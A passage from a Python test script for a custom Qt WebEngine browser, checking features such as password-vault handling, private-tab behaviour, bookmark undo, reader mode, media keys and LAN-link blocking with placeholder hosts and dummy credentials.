_kv79 = {f["id"]: f["value"] for f in _keep79["fields"]}
_clr79 = B.OnePasswordProvider._merged(
    _cur79, _it79, B.OnePasswordProvider._fields_for(
        _it79, cleared=("username",)))
_cv79 = {f["id"]: f["value"] for f in _clr79["fields"]}
check("a 1Password rename keeps the item's TOTP, note and username",
      _kv79 == {"username": "bob", "password": "pw", "totp": "SEED",
                "notesPlain": "my note"}, str(_kv79))
check("...a username he emptied is sent empty, and nothing else is",
      _cv79 == {"username": "", "password": "pw", "totp": "SEED",
                "notesPlain": "my note"}, str(_cv79))
check("...and a title change leaves the login's addresses as they were",
      [u["href"] for u in _keep79["urls"]]
      == ["https://a.example/login?x=1", "https://b.example/"],
      str(_keep79["urls"]))

# ===== batch 80: a terminal editor is started in a terminal ==============
_real_which80 = B.shutil.which
B.shutil.which = lambda name: {"kitty": "/usr/bin/kitty"}.get(name)
try:
    _c1 = br._editor_command("/usr/bin/nvim")
    _c2 = br._editor_command("/usr/bin/kate")
finally:
    B.shutil.which = _real_which80
B.shutil.which = lambda name: None
try:
    _c3 = br._editor_command("/usr/bin/nano")
finally:
    B.shutil.which = _real_which80
check("a terminal editor opens in a terminal, a window editor as it is",
      _c1 == ["/usr/bin/kitty", "-e", "/usr/bin/nvim"]
      and _c2 == ["/usr/bin/kate", "--block"] and _c3 is None,
      str((_c1, _c2, _c3)))

# ===== batch 82: the MPRIS adaptors answer to their interfaces ==========
_mp82 = getattr(B, "mpris", None)
_ifaces = []
if _mp82 is not None and _mp82.HAVE_DBUS:
    for _cls in (_mp82.Root, _mp82.Player):
        _mo = _cls.staticMetaObject
        _at = _mo.indexOfClassInfo("D-Bus Interface")
        _ifaces.append(_mo.classInfo(_at).value() if _at >= 0 else "")
check("the media-key adaptors declare the MPRIS interfaces",
      _ifaces == ["org.mpris.MediaPlayer2", "org.mpris.MediaPlayer2.Player"],
      str(_ifaces))

# ===== batch 83: a JSON chat component is previewed on chat's grey ======
_mm = br.minimessage_html('{"text":"Welcome","color":"white"}')
check("a JSON chat component is previewed on a dark background like chat",
      "background:#2b2b2b" in _mm and "Welcome" in _mm, _mm[:120])

# ===== batch 84: text zoom scales each text by itself, no compounding ====
_tz = br.new_tab(url=None); H.spin(200)
H.load(_tz, srv.url("/zoomtext")); H.spin(300)
_pay84 = dict(br.a11y_payload(), textZoom=150)
H.js(_tz, B.A11Y_JS.replace("A11YWANT", json.dumps(_pay84)), B.APP_WORLD_ID)
H.spin(300)
H.js(_tz, "var s = document.createElement('span'); s.id = 'late';"
          " s.textContent = 'late'; document.getElementById('p').appendChild(s); 1",
     B.MAIN_WORLD_ID)
H.spin(900)
_sz = json.loads(H.js(_tz, "JSON.stringify(['p','in','h1','h2','late'].map("
                           "function (i) { return parseFloat(getComputedStyle("
                           "document.getElementById(i)).fontSize); }))",
                      B.MAIN_WORLD_ID) or "[]")
check("text zoom scales each text by its own size and never compounds",
      len(_sz) == 5 and abs(_sz[0] - 24) < 0.6 and abs(_sz[1] - 24) < 0.6
      and abs(_sz[2] - 48) < 0.6 and abs(_sz[3] - 36) < 0.6
      and abs(_sz[4] - 24) < 0.6, str(_sz))
H.js(_tz, B.A11Y_JS.replace("A11YWANT", json.dumps(br.a11y_payload())),
     B.APP_WORLD_ID)
_close_if_open(_tz)

# ===== batch 85: full-screen reveal polls from F11; a reset shows the bar
_rv_was = br.config.get("revealInFullscreen", "__absent__")
br.config["revealInFullscreen"] = True
br.set_fullscreen(True); H.spin(300)
_pt85 = getattr(br, "_peek_timer", None)
_on85 = _pt85 is not None and _pt85.isActive()
br.set_fullscreen(False); H.spin(300)
_off85 = _pt85 is None or not _pt85.isActive()
if _rv_was == "__absent__":
    br.config.pop("revealInFullscreen", None)
else:
    br.config["revealInFullscreen"] = _rv_was
check("with reveal-in-fullscreen on, F11 starts the top-edge poll, and "
      "leaving stops it", _on85 and _off85, str((_on85, _off85)))
_ap85 = {k: br.config.get(k, "__absent__") for k in br.APPEARANCE_KEYS}
br.set_auto_hide_chrome(True); H.spin(200)
br.reset_appearance(keep_backup=False); H.spin(200)
_shown85 = getattr(br, "_chrome_shown", None)
for _k, _v in _ap85.items():
    if _v != "__absent__":
        br.config[_k] = _v
br.load_custom_themes()
br.apply_theme(br.config.get("theme", B.DEFAULT_THEME), save=False)
check("an appearance reset brings a hidden toolbar back", _shown85 is True,
      str(_shown85))

# ===== batch 86: what the second review of the shipped batches found =====
# a transcript whose cues are all blank makes no empty note
class _Desk86:
    saved = []

    def save_note(self, **k):
        _Desk86.saved.append(k)
        return {}
_rd86, _rt86 = br.desk, br.transcript
br.desk = lambda: _Desk86()
br.transcript = lambda view=None, then=None: then([{"t": 5, "text": "  "},
                                                  "junk"])
try:
    br.transcript_to_note(view=br.current())
finally:
    br.desk, br.transcript = _rd86, _rt86
check("a transcript of blank cues makes no empty note", _Desk86.saved == [],
      str(_Desk86.saved))
# the inspector, closed with its own X, opens again with one press
_iv86 = br.new_tab(url=None); H.spin(200)
H.load(_iv86, srv.url("/twhome"))
H.wait_for(lambda: "/twhome" in _iv86.url().toString(), 8000)
br.tabs.setCurrentWidget(_iv86); H.spin(200)
br.toggle_inspector(); H.spin(300)
_d1 = getattr(_iv86, "_devtools", None)
if _d1 is not None:
    _d1.close(); H.spin(400)
br.toggle_inspector(); H.spin(300)
_d2 = getattr(_iv86, "_devtools", None)
_open86 = _d2 is not None and _d2.isVisible()
br.toggle_inspector(); H.spin(300)
check("the inspector closed with its window's X opens again on one press",
      _d1 is not None and _open86, str((_d1 is not None, _open86)))
_close_if_open(_iv86)
# a setting already back at its default does not return with an undo
_ap86 = {k: br.config.get(k, "__absent__")
         for k in ("nightDim", "customThemes", "appearanceBackup", "theme")}
br.config["nightDim"] = 30
br.reset_appearance()
br.config["theme"] = br.config.get("theme") or B.DEFAULT_THEME
br.config["uiSize"] = 15
br.reset_appearance()
br.undo_reset_appearance()
_nd86 = br.config.get("nightDim")
for _k, _v in _ap86.items():
    if _v == "__absent__":
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v
br.config.pop("uiSize", None)
br.load_custom_themes()
br.apply_theme(br.config.get("theme", B.DEFAULT_THEME), save=False)
br.refresh_page_look()
check("an undo after two resets does not bring back a dimmer reset before",
      not _nd86, str(_nd86))
# the slow-connection menu's mark goes when he switches offline himself
_of86 = br.config.get("offline", False)
br.config["offline"] = False
br.throttle(view=br.current(), profile="offline")
br.work_offline(False)                    # his own switch
br.work_offline(True)                     # and on again, by him
br.throttle(view=br.current(), profile="off")
_still86 = br.config.get("offline")
br.config["offline"] = _of86
br.config.pop("offlineByThrottle", None)
check("throttle Off after he switched offline himself leaves it on",
      _still86 is True, str(_still86))
# "none here" from a private tab beats a parent domain's agent
_ag86 = dict(br.agent_sites())
br.agent_sites()["example.com"] = "firefox"
B._PRIVATE_AGENTS["a.example.com"] = ""
_none86 = br.agent_for("a.example.com", private=True)
B._PRIVATE_AGENTS.pop("a.example.com", None)
br.agent_sites().clear(); br.agent_sites().update(_ag86)
check("no agent chosen in a private tab is none, whatever the parent says",
      _none86 == "", str(_none86))
# the Settings autoplay switch while lite mode is on
_lt86 = {k: br.config.get(k, "__absent__")
         for k in ("liteMode", "blockAutoplay", "blockAutoplayOwn")}
br.config.update(liteMode=False, blockAutoplay=True)
br.lite_mode(True)
br.bridge.setSetting("blockAutoplay", "false")
_during86 = br.config.get("blockAutoplay")
br.lite_mode(False)
_after86 = br.config.get("blockAutoplay")
for _k, _v in _lt86.items():
    if _v == "__absent__":
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v
br.apply_web_attributes()
check("lite mode keeps autoplay blocked when Settings is touched meanwhile,"
      " and then gives his answer back", _during86 is True
      and _after86 is False, str((_during86, _after86)))
# a pre-restore copy is not one of the fourteen daily backups
_bdir86 = br.bookmark_backup_dir()
_bdir86.mkdir(parents=True, exist_ok=True)
(_bdir86 / "bookmarks-2001-02-02.json").write_text(json.dumps(
    [{"id": 1, "type": "link", "title": "o", "url": "https://o.example/",
      "parent": 0}]))
_bm86 = list(br.bookmarks)
br.bookmarks = [{"id": 9, "type": "link", "title": "n", "url": "https://n.example/",
                 "parent": 0}]
br.restore_bookmark_backup("bookmarks-2001-02-02.json")
_before86 = sorted(p.name for p in _bdir86.glob("bookmarks-before-restore-*.json"))
br.bookmarks = _bm86
br.save_bookmarks()
for _p in list(_bdir86.glob("bookmarks-before-restore-*.json")) + [
        _bdir86 / "bookmarks-2001-02-02.json"]:
    try:
        _p.unlink()
    except OSError:
        pass
check("a restore keeps what was there under its own before-restore name",
      len(_before86) == 1, str(_before86))
# OCR that cannot write its picture still answers
_real_mk = B.tempfile.mkstemp
_real_rt86 = br.record_tools
br.record_tools = lambda: {"tesseract": "/bin/true"}
B.tempfile.mkstemp = lambda *a, **k: (_ for _ in ()).throw(OSError("full"))
_ocr86 = {}
try:
    br.read_text_from_image(image=B.QImage(4, 4, B.QImage.Format.Format_RGB32),
                            then=lambda s: _ocr86.update(v=s))
finally:
    B.tempfile.mkstemp = _real_mk
    br.record_tools = _real_rt86
check("OCR that cannot write its picture still answers its caller",
      _ocr86.get("v") == "", str(_ocr86))
# a popup menu whose refused popups were all filtered says so
_pw86 = list(getattr(br, "_blocked_popups", []) or [])
br._blocked_popups = [{"url": "file:///etc/hostname"}]
_pm86 = [a.text() for a in br.popup_menu().actions()]
br._blocked_popups = _pw86
check("a popup menu with nothing it can offer says nothing was refused",
      br._ui_str("popupNone") in _pm86, str(_pm86))

# ===== third pass, part 1: secrets, scheduled and running downloads =====
br.bridge._last_generated = "gen-pw-87"
B.QGuiApplication.clipboard().clear()
_g87 = json.loads(br.bridge.copyGenerated(br._page_key) or "{}")
_md87 = B.QGuiApplication.clipboard().mimeData()
check("a generated password is copied as a secret and cleared later",
      _g87.get("ok") is True and _md87 is not None
      and _md87.hasFormat("x-kde-passwordManagerHint")
      and getattr(br, "_clip_mine", None) == "gen-pw-87", str(_g87))
B.QGuiApplication.clipboard().clear()
if br.vault is not None and not br.vault_locked():
    _e87 = br.vault.set_entry("review87.example", "https", "u87", "pw87")
    _log87 = []
    _real_na = br.vault.note_access
    br.vault.note_access = lambda i, f, what="revealed": _log87.append((f, what))
    try:
        br.bridge.revealField(br._page_key, (_e87 or {}).get("id", ""), "password")
    finally:
        br.vault.note_access = _real_na
    check("a password shown in the manager is written in the access log",
          ("password", "revealed") in _log87, str(_log87))
_sd_was = br.config.get("dlLater", "__absent__")
# a list of its own: an earlier test can leave the key as something else,
# and scheduled_downloads() then hands back a throwaway list
br.config["dlLater"] = [{"url": srv.url("/twhome"), "name": "x.html",
                         "when": 1}]
_real_rt87 = br._real_tabs
# the 30 s timer would start it from a normal tab during the spins below
# (the window still has one), and the explicit tick found an empty list --
# every window's timer: the windows earlier sections left open share this
# config, and one of them started the download
# (closed ones too: a closed window is hidden, not deleted, and its own
# timer runs on -- br.windows() lists only the open ones)
_dlt87 = [w._dl_later for w in B.QApplication.topLevelWidgets()
          if isinstance(w, B.Browser) and w._dl_later.isActive()]
for _t87 in _dlt87:
    _t87.stop()
_pv87 = br.new_tab(private=True); H.spin(300)
br.tabs.setCurrentWidget(_pv87); H.spin(200)
br._real_tabs = lambda *a, **k: [(br.tabs.indexOf(_pv87), _pv87)]
try:
    _st87 = br._schedule_tick()
finally:
    br._real_tabs = _real_rt87
    for _t87 in _dlt87:
        _t87.start()
_left87 = list(br.scheduled_downloads())
if _sd_was == "__absent__":
    br.config.pop("dlLater", None)
else:
    br.config["dlLater"] = _sd_was
_close_if_open(_pv87)
check("a scheduled download with no normal tab to start from stays scheduled",
      _st87 == 0 and len(_left87) == 1, str((_st87, _left87)))
br.downloads.append({"id": "dl87", "state": "active", "name": "big.iso",
                     "url": "https://x.example/big.iso"})
_f87 = br.forget_download("dl87", ask=False)
_kept87 = any(e.get("id") == "dl87" for e in br.downloads)
br.downloads[:] = [e for e in br.downloads if e.get("id") != "dl87"]
check("a download still arriving cannot be forgotten from the list",
      _f87 is False and _kept87, str((_f87, _kept87)))

# ===== third pass, part 2: element hider, own pages, restored sessions ===
_sel88 = B.page_guard.selector_for([
    {"tag": "DIV", "id": "main", "class": ""}, {"tag": "UL", "id": "", "class": ""},
    {"tag": "LI", "id": "", "class": "item"}])
_html88 = B.page_guard.selector_for([{"tag": "HTML", "id": "", "class": ""}])
check("the element hider names the clicked element, never an ancestor alone",
      _sel88 == "#main > ul > li.item" and _html88 == "", str((_sel88, _html88)))
_cfg88 = dict(br.config, guardNoWebRTC=True)
_src88 = B.page_guard.source(_cfg88, own="/opt/browser/")
check("the guard script skips the browser's own pages",
      '"own":"/opt/browser/"' in _src88
      and "location.pathname.indexOf(R.own) === 0) return" in _src88)
_sess_was = list(br.sessions)
if not any(e.get("sid") == "rv88" for e in br.sessions):
    br.sessions.append({"name": "Review 88", "sid": "rv88"})
_r88 = br.open_tab_state([{"u": srv.url("/twhome"), "s": "rv88"}],
                         lazy=False)
H.spin(400)
_s88 = getattr(_r88[0], "session", None) if _r88 else None
for _v in _r88:
    _close_if_open(_v)
br.sessions[:] = _sess_was
check("a restored tab goes back into the virtual browser it was in",
      _s88 == "rv88", str(_s88))

# ===== third pass, part 3: private handoffs, webmail, video cap ==========
_asked89 = []
_real_ask89, _real_tor89 = br._ask_handoff, br.torrent_handoff
br._ask_handoff = lambda kind, target, site, shown_site=None: (
    _asked89.append((site, shown_site)) or True)
br.torrent_handoff = lambda t: True
_hs89 = json.dumps(br.config.get("handoffSites") or {})
br.config.setdefault("handoffSites", {})["torrent@secret89.example"] = True
try:
    br.page_handoff("torrent", "magnet:?xt=urn:x", "secret89.example",
                    private=True)
finally:
    br._ask_handoff, br.torrent_handoff = _real_ask89, _real_tor89
    br.config["handoffSites"] = json.loads(_hs89)
check("a private tab's handoff always asks and offers no 'always'",
      _asked89 == [("", "secret89.example")], str(_asked89))
_pv89 = br.new_tab(private=True); H.spin(300)
_mt89 = []
_real_mu, _real_nt89 = br.mailto_url, br.new_tab
br.mailto_url = lambda m: "https://mail.example/compose?to=a"
br.new_tab = lambda *a, **k: _mt89.append(bool(k.get("private"))) or None
try:
    br.open_mailto("mailto:a@b.example", _pv89)
finally:
    br.mailto_url, br.new_tab = _real_mu, _real_nt89
_close_if_open(_pv89)
check("webmail from a private tab opens in a private tab", _mt89 == [True],
      str(_mt89))
_caps89 = []
_real_cv = br.cap_video
br.cap_video = lambda h, *a, **k: _caps89.append(h)
try:
    br.bridge.setSetting("videoCap", "0")
    br.bridge.setSetting("videoCap", "720")
finally:
    br.cap_video = _real_cv
    br.config.pop("videoCap", None)
# 'as it comes' (0) is sent to the open tabs to lift a cap (fix209);
# what must never happen is 480p
check("'as it comes' takes the video cap off instead of setting 480p",
      480 not in _caps89 and _caps89 and _caps89[-1] == 720
      and set(_caps89) <= {0, 720}, str(_caps89[:6]))

# ===== third pass, part 4: bookmark undo with a reused id, start page ====
_bm90 = list(br.bookmarks)
br.bookmarks = [{"id": 10, "type": "link", "title": "A", "url": "https://a90.example/",
                 "parent": 0, "t": 1000}]
br.save_bookmarks()
br.remove_bookmark(10)
br.bookmarks.append({"id": 10, "type": "link", "title": "B",
                     "url": "https://b90.example/", "parent": 0, "t": 2000})
br.undo_bookmark_delete()
_urls90 = sorted((b.get("url"), b.get("id")) for b in br.bookmarks)
br.bookmarks = _bm90
br.save_bookmarks()
check("undo brings a bookmark back even when a new one took its id",
      [u for u, _i in _urls90] == ["https://a90.example/", "https://b90.example/"]
      and len({i for _u, i in _urls90}) == 2, str(_urls90))
_sp90 = br.new_tab(); H.spin(1000)
H.wait_for(lambda: jsq(_sp90, "typeof loadExtras", B.MAIN_WORLD_ID)
           == "function", 8000)
check("the start page answers when its settings change",
      H.js(_sp90, "typeof window.__settingsChanged", B.MAIN_WORLD_ID)
      == "function")
_close_if_open(_sp90)

# ===== third pass, part 5: CSV history, guard masks, agent waits ========
_vd91 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
_v91 = B.PasswordVault(_vd91)
_v91.set_entry("example.com", "https", "bob", "old-A")
_v91.import_csv("url,username,password\nhttps://example.com,bob,new-B\n")
_it91 = _v91.get("example.com", "bob") or {}
check("a CSV import keeps the password it replaces in the history",
      _it91.get("password") == "new-B"
      and any(h.get("password") == "old-A" for h in _it91.get("history") or []),
      str([h.get("password") for h in _it91.get("history") or []]))
_src91 = B.page_guard.source(dict(br.config, guardFingerprint=True))
check("the fingerprint guard masks WebGL2 too and nudges audio once",
      "WebGL2RenderingContext" in _src91 and "new WeakSet()" in _src91
      and "((seed % 7) + 1)" in _src91)
import agent_bridge as _ab91
_ev91 = br.new_tab(url=None); H.spin(200)
H.load(_ev91, srv.url("/twhome"))
H.wait_for(lambda: "/twhome" in _ev91.url().toString(), 8000)
_bad91 = H.js(_ev91, _ab91._EXISTS_JS % json.dumps("div["), B.APP_WORLD_ID)
_ok91 = H.js(_ev91, _ab91._EXISTS_JS % json.dumps("p"), B.APP_WORLD_ID)
_close_if_open(_ev91)
check("an agent wait on a broken selector says so instead of 'gone'",
      _bad91 == "bad-selector" and _ok91 is True, str((_bad91, _ok91)))

# ===== third pass, part 6: history undo, torrents, handoffs, notes ======
_h92 = list(br.history)
_n92 = int(B.time.time())
br.history = [{"url": "https://a92.example/", "title": "a", "t": _n92 - 10}]
br.forget_history_site("a92.example")
br.delete_history_entries(["https://nothing92.example/"])
_u92 = br.undo_history_delete()
_back92 = [e["url"] for e in br.history]
br.history = _h92
br.save_history()
check("a delete of nothing keeps the undo of the delete before it",
      _back92 == ["https://a92.example/"], str((_u92, _back92)))
_tor92 = []
_real_prog92 = br._torrent_program
br._torrent_program = lambda: "/bin/true"
_real_popen92 = B.subprocess.Popen
B.subprocess.Popen = lambda args, **k: _tor92.append(args) or type("P", (), {})()
try:
    br.torrent_handoff("https://x.example/get/file.torrent?token=abc")
finally:
    br._torrent_program = _real_prog92
    B.subprocess.Popen = _real_popen92
check("a .torrent address with a query is handed to the torrent client",
      len(_tor92) == 1, str(_tor92))
_cd92 = B.notes.Desk(_Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent))))
(_cd92.folder / "collections").mkdir(parents=True, exist_ok=True)
(_cd92.folder / "collections" / "Reading List.md").write_text("- a\n")
_names92 = _cd92.collections()
check("a collection dropped into the folder can be shown and deleted",
      "Reading List" in _names92 and _cd92.collection("Reading List") == "- a\n"
      and _cd92.delete_collection("Reading List"), str(_names92))

# ===== third pass, part 7: the agenda's UTC times and all-day spans ======
_ics93 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent))) / "cal.ics"
_day93 = B.time.strftime("%Y%m%d")
_noon_utc = B.calendar.timegm(B.time.strptime(_day93 + "120000", "%Y%m%d%H%M%S"))
_local_hm = B.time.strftime("%H:%M", B.time.localtime(_noon_utc))
_y93 = B.time.strftime("%Y%m%d", B.time.localtime(B.time.time() - 86400))
_t93 = B.time.strftime("%Y%m%d", B.time.localtime(B.time.time() + 86400))
_ics93.write_text(
    "BEGIN:VCALENDAR\r\nBEGIN:VEVENT\r\nDTSTART:%sT120000Z\r\n"
    "SUMMARY:Lunch with a very long name that is folded onto \r\n the next line\r\n"
    "END:VEVENT\r\nBEGIN:VEVENT\r\nDTSTART;VALUE=DATE:%s\r\nDTEND;VALUE=DATE:%s\r\n"
    "SUMMARY:Trip\r\nEND:VEVENT\r\nEND:VCALENDAR\r\n" % (_day93, _y93, _t93))
_ag93 = br.agenda_today(path=str(_ics93))
check("the agenda shows a UTC event at his own clock time and an all-day span",
      any(r["at"] == _local_hm and "folded onto the next line" in r["name"]
          for r in _ag93) and any(r["name"] == "Trip" for r in _ag93),
      str(_ag93))

# ===== review of 86-93: folders in the bookmark undo, collection writes ===
_bm94 = list(br.bookmarks)
br.bookmarks = [{"id": 20, "type": "folder", "title": "Old", "url": "",
                 "parent": 0, "t": 1000},
                {"id": 21, "type": "link", "title": "in", "url": "https://in94.example/",
                 "parent": 20, "t": 1001}]
br.save_bookmarks()
br.remove_bookmark(20)
br.bookmarks.append({"id": 20, "type": "folder", "title": "New", "url": "",
                     "parent": 0, "t": 2000})
br.undo_bookmark_delete()
_titles94 = sorted(b.get("title") for b in br.bookmarks if b.get("type") == "folder")
_child94 = [b for b in br.bookmarks if b.get("url") == "https://in94.example/"]
_old94 = [b for b in br.bookmarks if b.get("title") == "Old"]
br.bookmarks = _bm94
br.save_bookmarks()
check("undo brings back a deleted folder whose id a new folder took",
      _titles94 == ["New", "Old"] and _child94 and _old94
      and _child94[0].get("parent") == _old94[0].get("id"),
      str((_titles94, _child94, _old94)))
_cd94 = B.notes.Desk(_Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent))))
(_cd94.folder / "collections").mkdir(parents=True, exist_ok=True)
(_cd94.folder / "collections" / "Reading List.md").write_text("- a\n")
_cd94.add_to_collection("Reading List", "b")
check("adding to a hand-made collection adds to that file",
      sorted(p.name for p in (_cd94.folder / "collections").glob("*.md"))
      == ["Reading List.md"] and "- b" in _cd94.collection("Reading List"),
      str(sorted(p.name for p in (_cd94.folder / "collections").glob("*.md"))))

# ===== fourth pass, part 1: pop-out, private generator, prompts, notes ===
_pw95 = br.new_window(); H.spin(900)
_only95 = [_pw95.tabs.widget(i) for i in range(_pw95.tabs.count())
           if not _pw95._is_header(_pw95.tabs.widget(i))]
_mini95 = _pw95.pop_out_tab(_pw95.tabs.indexOf(_only95[0])) if _only95 else None
H.spin(400)
try:
    _alive95 = _pw95.isVisible() and any(
        not _pw95._is_header(_pw95.tabs.widget(i)) for i in range(_pw95.tabs.count()))
except RuntimeError:
    _alive95 = False
check("popping out the only tab keeps the window, with a fresh tab",
      _mini95 is not None and _alive95, str((_mini95 is not None, _alive95)))
try:
    if _mini95 is not None:
        _mini95.close()
    H.spin(300)
    _pw95.close()
except RuntimeError:
    pass
H.spin(400)
if br.vault is not None and not br.vault_locked():
    _gp95 = br.new_tab(private=True); H.spin(300)
    H.load(_gp95, srv.url("/pwform"))
    H.wait_for(lambda: "/pwform" in _gp95.url().toString(), 8000)
    _before95 = len(br.vault.logins())
    _vpw95 = br.config.get(B.VAULT_PASSWORD_KEY, "__absent__")
    br.config[B.VAULT_PASSWORD_KEY] = True
    _g95 = {}
    br.generate_for_page(view=_gp95, then=lambda s: _g95.update(v=s))
    H.wait_for(lambda: "v" in _g95, 8000)
    _after95 = len(br.vault.logins())
    if _vpw95 == "__absent__":
        br.config.pop(B.VAULT_PASSWORD_KEY, None)
    else:
        br.config[B.VAULT_PASSWORD_KEY] = _vpw95
    _close_if_open(_gp95)
    check("a password generated in a private tab is filled but not saved",
          bool(_g95.get("v")) and _after95 == _before95,
          str((bool(_g95.get("v")), _before95, _after95)))
B.QGuiApplication.clipboard().clear()
br._pw_pending = {"host": "h95.example", "scheme": "https",
                  "username": "u95", "password": "secret95"}
br._password_prompt("h95.example", "u95", False); H.spin(100)
_held95 = br._pw_pending is not None
br._hide_toast(); H.spin(100)
check("a save-password question pushed away lets go of the password",
      _held95 and br._pw_pending is None, str(br._pw_pending))
_pn95 = br.new_tab(private=True); H.spin(300)
H.load(_pn95, srv.url("/twhome"))
H.wait_for(lambda: "/twhome" in _pn95.url().toString(), 8000)
_notes_was = json.dumps(br.config.get("pageNotes") or {})
br.page_note(text="private reminder 95", view=_pn95)
_read95 = br.page_note(view=_pn95)
_disk95 = json.dumps(br.config.get("pageNotes") or {})
_close_if_open(_pn95)
H.spin(300)
check("a page note in a private tab is kept in memory, not in config.json",
      _read95 == "private reminder 95" and _disk95 == _notes_was,
      str((_read95, _disk95 == _notes_was)))

# ===== fourth pass, part 2: reader, bar, volume, calls, MPRIS, wiki ======
_rv96 = br.new_tab(url=None); H.spin(200)
H.load(_rv96, srv.url("/art96"))
H.wait_for(lambda: "art96" in _rv96.url().toString(), 8000)
# the document itself, not just its address: under a CPU quota the
# reader ran on a page still loading and found no article
H.wait_for(lambda: jsq(_rv96, "document.readyState === 'complete' && "
                       "document.body.innerText.length > 300"), 9000)
br.tabs.setCurrentWidget(_rv96); H.spin(200)
br.reader_mode(_rv96)
H.wait_for(lambda: jsq(_rv96, "!!document.getElementById('__readercss')",
                       B.MAIN_WORLD_ID), 5000)
_on96 = jsq(_rv96, "!!document.getElementById('__readercss')", B.MAIN_WORLD_ID)
_w96 = br.reader_options().get("width")
br.set_reader_option("width", 52); H.spin(500)
H.wait_for(lambda: jsq(_rv96, "!!document.getElementById('__readercss')",
                       B.MAIN_WORLD_ID), 3000)
_still96 = jsq(_rv96, "!!document.getElementById('__readercss')", B.MAIN_WORLD_ID)
br.set_reader_option("width", _w96 or 70)
br.reader_mode(_rv96); H.spin(300)
_close_if_open(_rv96)
check("changing a reader option keeps the reader on",
      _on96 is True and _still96 is True, str((_on96, _still96)))
_bmk96 = list(br.bookmarks)
br.bookmarks.append({"id": 9696, "type": "link", "title": "zzbm96 tool",
                     "url": "", "js": "alert(1)", "parent": 0})
_rows96 = br._own_suggestions("zzbm96")
br.bookmarks = _bmk96
check("a bookmarklet is no address-bar row that searches for nothing",
      not any("zzbm96" in r for r in _rows96), str(_rows96))
_vv96 = br.new_tab(url=None); H.spin(200)
H.load(_vv96, srv.url("/vid"))
H.wait_for(lambda: "/vid" in _vv96.url().toString(), 8000)
H.js(_vv96, "document.getElementById('v').volume = 0.5; 1", B.MAIN_WORLD_ID)
br.media_tool("volumeto", view=_vv96, level=0.8); H.spin(300)
_vol96 = H.js(_vv96, "document.getElementById('v').volume", B.MAIN_WORLD_ID)
_close_if_open(_vv96)
check("a remembered volume is set, not stepped to", _vol96 == 0.8, str(_vol96))
_res96 = []
_real_rac = br.resume_after_call
br.resume_after_call = lambda: _res96.append(1) or 0
_live_was96, _paused_was96 = br._media_live, list(br._paused_for_call)
br._media_live = [{"view": br.current(), "kind": "microphone"}]
br._paused_for_call = [br.current()]
try:
    br._media_seen([])
finally:
    br.resume_after_call = _real_rac
    br._media_live, br._paused_for_call = _live_was96, _paused_was96
check("music paused for a call plays again when the call ends", _res96 == [1],
      str(_res96))
_did96 = []
class _FakeB96(B.QObject):
    pass
_fb96 = _FakeB96()
_fb96.browser = type("Br", (), {"media_do": staticmethod(lambda a: _did96.append(a))})()
if getattr(B, "mpris", None) is not None and B.mpris.HAVE_DBUS:
    _pl96 = B.mpris.Player(_fb96)
    _pl96.Next(); _pl96.Previous()
check("the media keys' next and previous ask for the Media Session's actions",
      _did96 == ["nexttrack", "previoustrack"], str(_did96))
_wk96 = []
_pw96 = br.new_tab(private=True); H.spin(300)
_real_nt96, _real_op96 = br.new_tab, br.open_panel
br.new_tab = lambda *a, **k: _wk96.append(("tab", bool(k.get("private")))) or object()
br.open_panel = lambda *a, **k: _wk96.append(("panel",)) or True
try:
    br.wiki_lookup("Creeper farm", view=_pw96)
finally:
    br.new_tab, br.open_panel = _real_nt96, _real_op96
_close_if_open(_pw96)
check("the wiki from a private tab opens a private tab, not the panel",
      _wk96 == [("tab", True)], str(_wk96))

# ===== fourth pass, part 3: typed LAN addresses, close focus, split view ==
_lp97 = br.new_tab(url=None); H.spin(200)
H.load(_lp97, srv.url("/twhome"))
H.wait_for(lambda: "/twhome" in _lp97.url().toString(), 8000)
_pg97 = _lp97.page()
_pg97.url = lambda: B.QUrl("https://news97.example/")
_NT97 = B.QWebEnginePage.NavigationType
_typed97 = _pg97.acceptNavigationRequest(B.QUrl("http://192.168.1.1/"),
                                         _NT97.NavigationTypeTyped, True)
_link97 = _pg97.acceptNavigationRequest(B.QUrl("http://192.168.1.1/"),
                                        _NT97.NavigationTypeLinkClicked, True)
del _pg97.url
_close_if_open(_lp97)
check("typing a home-network address is allowed; a page's link to it is not",
      _typed97 is True and _link97 is False, str((_typed97, _link97)))
_cf97 = br.config.get("closeFocus", "right")
br.config["closeFocus"] = "last"
_a97 = br.new_tab(url=None); H.spin(150)
_c97 = br.new_tab(url=None); H.spin(150)
_e97 = br.new_tab(url=None, switch=False); H.spin(150)
br.tabs.setCurrentWidget(_a97); H.spin(150)
br.tabs.setCurrentWidget(_c97); H.spin(150)
br.close_tab(br.tabs.indexOf(_c97), ask=False); H.spin(200)
_land97 = br.current()
br.config["closeFocus"] = _cf97
check("closing a tab with 'the one before' goes back to the tab before",
      _land97 is _a97, str(br.tabs.indexOf(_land97)))
for _t in (_a97, _e97):
    _close_if_open(_t)
_sv97 = br.new_tab(url=None); H.spin(200)
H.load(_sv97, srv.url("/timers"))
H.wait_for(lambda: "/timers" in _sv97.url().toString(), 8000)
br.split_view(index=br.tabs.indexOf(_sv97)); H.spin(400)
br._save_groups(quiet=False)
_saved97 = json.dumps(br.config.get("sessionTabs") or {})
br.close_split(); H.spin(200)
_close_if_open(_sv97)
check("the split view's tab is in the saved session", "/timers" in _saved97,
      _saved97[:200])

# ===== fourth pass, part 4: one browser's cookie wipe is that browser's ===
_coe98 = {k: br.config.get(k, "__absent__") for k in ("clearOnExit", "cookiesWipePending")}
br.config["clearOnExit"] = {"work98": ["cookies"]}
br.config.pop("cookiesWipePending", None)
br.clear_on_exit_per_session()
_mark98 = br.config.get("cookiesWipePending")
for _k, _v in _coe98.items():
    if _v == "__absent__":
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v
check("one virtual browser's clear-cookies-on-exit marks only its own jar",
      _mark98 == ["browser-s-work98"], str(_mark98))

# ===== fourth pass, part 5: the session-keeping window hands the job on ===
_w1_99 = br.new_window(); H.spin(700)
_w1_99._session_timer.start()
B.QApplication.instance().aboutToQuit.connect(_w1_99._save_groups)
_w2_99 = br.new_window(); H.spin(700)
_w1_99.close(); H.spin(400)
_handed99 = (not _w1_99._session_timer.isActive()
             and _w2_99._session_timer.isActive())
try:
